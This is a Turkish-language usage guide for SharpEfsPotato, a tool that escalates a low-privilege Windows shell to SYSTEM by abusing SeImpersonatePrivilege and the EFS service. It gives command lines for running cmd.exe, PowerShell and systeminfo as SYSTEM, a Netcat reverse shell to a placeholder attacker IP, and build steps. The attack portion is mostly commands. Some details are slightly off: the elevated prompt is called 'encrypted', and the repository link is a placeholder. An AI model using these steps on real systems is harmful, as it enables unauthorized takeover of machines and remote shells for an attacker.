c# SharpEfsPotato.exe Kullanım Kılavuzu

## Giriş
SharpEfsPotato, Windows ortamlarında SeImpersonatePrivilege yetkisini kullanarak SYSTEM seviyesinde yetki yükseltmek için tasarlanmış bir aracır. Bu yüzden, genellikle önceden kazanılmış düşük seviyeli bir kabuk (ör. LOCAL SERVICE veya NETWORK SERVICE) üzerinde kullanılır.

---

## Özellikler
- **EFS Abuse**: Windows Encrypting File System (EFS) hizmetini kullanarak SYSTEM yetkisi elde eder.
- **Hedefli Komut Çalıştırma**: Yüksek yetkiyle belirli komutları çalıştırabilir.
- **Basit ve Etkili**: Windows hizmetlerini hedef alarak kolayca SYSTEM yetkisi kazanır.

---

## Gereksinimler
- SeImpersonatePrivilege yetkisine sahip bir kullanıcı hesabı.
- Windows 10 veya Windows Server ortamı.

---

## Komut Satırı Kullanımı

### Yardım Mesajını Görüntüleme
SharpEfsPotato'nun yardım mesajını görmek için:
```cmd
SharpEfsPotato.exe -h
```

### SYSTEM Yetkisiyle Komut Çalıştırma
Bir komutun SYSTEM yetkisiyle çalıştırılması için:
```cmd
SharpEfsPotato.exe -c "<komut>"
```
**Örnek:** SYSTEM seviyesinde bir komut istemi (şifrelenmiş cmd.exe) çalıştırmak için:
```cmd
SharpEfsPotato.exe -c "cmd.exe"
```

### Reverse Shell Açma
Bir uzak sistemden geri bağlantı (örn. Netcat ile) almak için:
```cmd
SharpEfsPotato.exe -c "nc.exe <saldırgan_IP> <port> -e cmd.exe"
```

---

## Örnek Kullanımlar

### Temel SYSTEM Yetki Yükseltme
EFS exploit kullanarak SYSTEM seviyesine geçmek için:
```cmd
SharpEfsPotato.exe
```

### Hedefli Komutları SYSTEM Yetkisiyle Çalıştırma
PowerShell'i SYSTEM yetkisiyle başlatmak için:
```cmd
SharpEfsPotato.exe -c "powershell.exe"
```

### Sistem Bilgisi Toplama
SYSTEM yetkisiyle sistem bilgilerini toplamak için:
```cmd
SharpEfsPotato.exe -c "systeminfo"
```

---

## Derleme Talimatları
SharpEfsPotato kaynak koddan derlenebilir.

### Adımlar:
1. Visual Studio Community Edition'ı indirin ve yükleyin.
2. Projeyi açın (`SharpEfsPotato.sln`).
3. Çözüm yapılandırmasını "Release" olarak seçin.
4. Projeyi derleyin.

---

## Notlar
- Araç, yalnızca SeImpersonatePrivilege yetkisine sahip bir ortamda işlevseldir.
- Bazı sistemlerde exploit çalıştırılmasının engellenmesi için güvenlik yamaları uygulanmış olabilir.

---

## Kaynaklar
- [SharpEfsPotato GitHub](https://github.com/your-repo/SharpEfsPotato)
- [SpecterOps Blog Yazıları](https://posts.specterops.io/)

Bu rehber, SharpEfsPotato aracını kullanmanın temel adımlarını kapsamaktadır. Daha fazla bilgi için yukarıdaki bağlantılara göz atabilirsiniz.
